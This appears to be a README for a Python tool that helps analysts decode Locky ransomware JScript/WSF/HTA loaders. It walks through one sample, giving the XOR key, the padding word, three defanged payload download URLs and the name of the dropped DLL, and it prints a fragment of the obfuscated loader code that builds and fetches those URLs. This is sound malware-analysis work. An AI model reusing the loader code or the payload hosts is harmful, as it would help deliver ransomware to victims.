# Locky

Source: **https://www.flashpoint-intel.com/anatomy-locky-zepto-ransomware/**

Source:

Usage: **python LockyExtractor.py --> path to the local JScript Locky file.

**Goal**: Assist analysts with decoding and obtain relevant information from Locky HTA Application (HTA) and Windows Script File (WSF) JSCRIPT loaders.

Locky ransomware was notorious for its usage of the second-stage JavaScript and Windows Script File JSCRIPT in its spray-and-pray attacks.

**These are classic simple XOR-ed .wsf/.hta SCRIPT payloads used by this gang.**

For example, let’s take a look at this:

**sample 3d91a6ffed8b038363a0ead0f8985d1bdf88ba543aff0bcab048819d70455073.jscript.**


**Padding word:**

LICIZAX

**XOR Key:**

b6vYxEjsTYwJ7mIrZz4WFSGHeaddkwbq

**Payload URI: (*remove padding word and decode Base64): **

goldenladywedding[.]com/vdG76VUY76rjnu?CHhjpz=zhXHhhwS
www[.]jmetalloysllp[.]com/vdG76VUY76rjnu?CHhjpz=zhXHhhwS
livewebsol[.]com/vdG76VUY76rjnu?CHhjpz=zhXHhhwS

**Filename in %TEMP%/AppData/ (launched by rundll32.exe with ‘qwerty'):**

NqmXYsBdh[.]dll

**Here is the relevant function right below the eval() one:**

var brigadabrigadalalapolicMOTALO2HORDA17 = "NqmXYsBdh";
var brigadabrigadalalapolicTRAxKey = brigadabrigadalalapolicMOTALO2fsta("b6vYxEjsTYwJ7mIrZz4WFSGHeaddkwbq");
var brigadabrigadalalapolicMOTALO2_a5 = ["Z29sZGVubGFkeLICIZAXXdlZGRpbmcuY29tL3ZkRzc2VlVZNzZyam51","dLICIZAX3d3LmptZXRhbGxveXNsbHAuYLICIZAX29tL3ZkRzc2VlVZNzZyam51","bGl2ZXdlYnNvbC5jb20vdmRHLICIZAXNzZWVVk3NnJqbnU="]; 
var brigadabrigadalalapolicMOTALO2HORDAI = 0;
for(brigadabrigadalalapolicMOTALO2HORDA5 in brigadabrigadalalapolicMOTALO2_a5){
brigadabrigadalalapolicMOTALO2HORDAI++;
try{
var brigadabrigadalalapolicMOTALO2HORDA6 =brigadabrigadalalapolicMOTALO2_bChosteck.brigadabrigadalalapolicMRADXHO() + brigadabrigadalalapolicMOTALO2_a5[brigadabrigadalalapolicMOTALO2HORDA5].brigadabrigadalalapolicMRADXHO() + "?CHhjpz=zhXHhhwS";
if(brigadabrigadalalapolicMOTALO2_a2(brigadabrigadalalapolicMOTALO2HORDA6,brigadabrigadalalapolicMOTALO2HORDA17+brigadabrigadalalapolicMOTALO2HORDAI)){
break;
